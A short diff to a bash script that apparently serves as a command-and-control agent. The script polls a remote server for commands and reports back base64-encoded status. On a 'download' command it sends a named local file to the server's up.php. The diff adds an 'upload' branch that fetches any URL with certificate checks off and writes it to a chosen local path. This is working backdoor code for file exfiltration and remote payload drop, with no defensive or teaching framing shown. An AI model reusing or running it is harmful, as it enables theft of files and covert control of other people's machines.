@@ -25,6 +25,20 @@ elif [[ $act == "download" ]];
 then
 file=$(echo $cmds | grep $1 | cut -f 3- -d ":")
 curl -sk -X POST $2/res.php -d "res=$(echo -n "Uploading $file" | base64)&id=$1" > /dev/null
-curl -sk -F data=@$(echo -n $file) $2/up.php?id=$1 > /dev/null
+curl -sk -F data=@$(echo -n $file) $2/up.php?id=$1
+sleep 10
+
+
+elif [[ $act == "upload" ]];
+then
+url=$(echo $cmds | grep $1 | cut -f 3,4 -d ":")
+echo $url
+path=$(echo $cmds | grep $1 | cut -f 5- -d ":")
+echo $path
+curl -sk -X POST $2/res.php -d "res=$(echo -n "Downloading $url to $path" | base64)&id=$1" > /dev/null
+curl -sk  $url > $path
+sleep 10
 fi
+
+sleep 10
 done
